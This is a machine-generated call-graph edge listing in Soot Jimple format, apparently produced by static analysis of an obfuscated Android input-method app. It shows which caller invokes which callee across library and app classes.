INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(3) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $r7 = interfaceinvoke $r3.<java.util.Map: java.util.Set entrySet()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lig: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<ljd: int size()>() in <ljb: void a()> ==> <ljd: int size()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r1, null) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i1, $i0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lqr: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ac(int)>($i0) in <lly: void j(java.lang.Object)> ==> <izw: int ac(int)>
STATIC edge: staticinvoke <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <lly: lma g()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<ltc: void <init>(java.lang.String,int,int)>("MEDIUM", 1, 20) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("CuratedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete privateUse subtag, error index: ") in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(58) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<her: void <init>(miy)>($r0) in <her: her k(miy)> ==> <her: void <init>(miy)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("identifier must not be empty") in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r0 = staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Runtime: java.lang.Runtime getRuntime()>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke $r0.<lth: void <init>(lto)>($r1) in <lth: lth i(java.lang.String)> ==> <lth: void <init>(lto)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(7) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
CLINIT edge: staticinvoke <lql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lql: void <clinit>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r13, $r11) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: void q(lsz,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
CLINIT edge: staticinvoke <iwt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iwt: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_SEARCH_FEATURE", 0, 0) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(12) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r3 = virtualinvoke $r30.<java.lang.StringBuilder: java.lang.String toString()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]: ") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <iye: void Q(int,int)>
CLINIT edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagFactory") in <hbu: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.Error: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(15) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsc: lsw a(java.util.logging.Level)>($r2) in <lsc: lsw d()> ==> <lsh: lsw a(java.util.logging.Level)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(11) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<lma: lsa l()>() in <llg: void <init>(llo)> ==> <lqn: lsa l()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_count", class "Ljava/lang/Integer;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jlu: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>(0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lka: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int j()>() in <qj: int b(java.lang.Object)> ==> <qj: int j()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(18) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $i2 = staticinvoke <lma: int e(int)>($i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
INTERFACE edge: $z0 = interfaceinvoke $r3.<java.util.List: boolean isEmpty()>() in <ivv: ivw a()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String replace(char,char)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: lma g()> ==> <lma: int e(int)>
STATIC edge: $r0 = staticinvoke <iye: lfa p(lfa)>($r1) in <hfd: void <clinit>()> ==> <iye: lfa p(lfa)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: boolean m()>
SPECIAL edge: specialinvoke $r13.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <lqq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqq: void <clinit>()>
SPECIAL edge: $r3 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r8, $i0) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>()> ==> <lkf: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <iec: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.p: void <init>()> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <ltf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltf: void <clinit>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jhe: void <init>(lak,lsr,int,byte[])> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <lsl: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsl: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lwe: void <init>()>() in <lwa: void <init>()> ==> <lwe: void <init>()>
STATIC edge: $i8 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String b()>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Set: java.lang.Object[] toArray()>() in <ljf: java.lang.Object[] toArray()> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<qj: java.lang.Object get(java.lang.Object)>($r0) in <ivw: ivw g(java.lang.String)> ==> <qj: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.Set: java.util.Iterator iterator()>() in <lri: int b(java.util.Set)> ==> <lqs: java.util.Iterator iterator()>
STATIC edge: $i1 = staticinvoke <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>($r2, $r1, 3) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>
SPECIAL edge: specialinvoke $r13.<lvq: void <init>(lvr,int)>(r0, $i1) in <lvr: void <init>(lvr,lvr)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i8 = staticinvoke <izw: int ac(int)>($i6) in <lma: lma i(int,java.lang.Object[])> ==> <izw: int ac(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Missing subtags to form a valid language tag") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean z(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: int hashCode()> ==> <ivw: java.lang.String p()>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r12 = virtualinvoke $r7.<lts: java.lang.Object e(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object e(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(1) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<lvr: void <init>(java.util.List)>($r0) in <lvt: void <clinit>()> ==> <lvr: void <init>(java.util.List)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <ltr: int b()>
STATIC edge: $z0 = staticinvoke <ivw: boolean v(java.lang.String)>($r0) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean v(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
STATIC edge: $z0 = staticinvoke <java.lang.reflect.Modifier: boolean isStatic(int)>($i2) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.reflect.Modifier: boolean isStatic(int)>
STATIC edge: $l2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l2) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <ljf: java.lang.Object[] toArray()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r26 = virtualinvoke $r25.<java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>("addSuppressed", $r24) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
CLINIT edge: staticinvoke <java.util.logging.Level: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.logging.Level: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
CLINIT edge: staticinvoke <miv: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <miv: void <clinit>()>
STATIC edge: $r5 = staticinvoke <lma: lma i(int,java.lang.Object[])>(5, $r4) in <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lma: lma i(int,java.lang.Object[])>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(double[],double[])>($r16, $r17) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(double[],double[])>
CLINIT edge: staticinvoke <lwf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwf: void <clinit>()>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r1) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.p: void <init>()>() in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.p: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.String: char[] toCharArray()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
STATIC edge: $r4 = staticinvoke <lma: lma r(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lsg: void <init>()>() in <lsh: void <clinit>()> ==> <lsg: void <init>()>
SPECIAL edge: specialinvoke $r12.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_IMAGE", 12, 12) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lte: void <init>()> ==> <lsv: void <init>()>
STATIC edge: $r4 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i0, $i1, 0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "log site key") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivv: void <init>()> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: $r12 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r24.<lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>($r21, $r6, $r22) in <lsd: boolean b(lsr)> ==> <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<lfb: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfb: void <init>(lfa)>
SPECIAL edge: specialinvoke $r6.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: void <init>()>
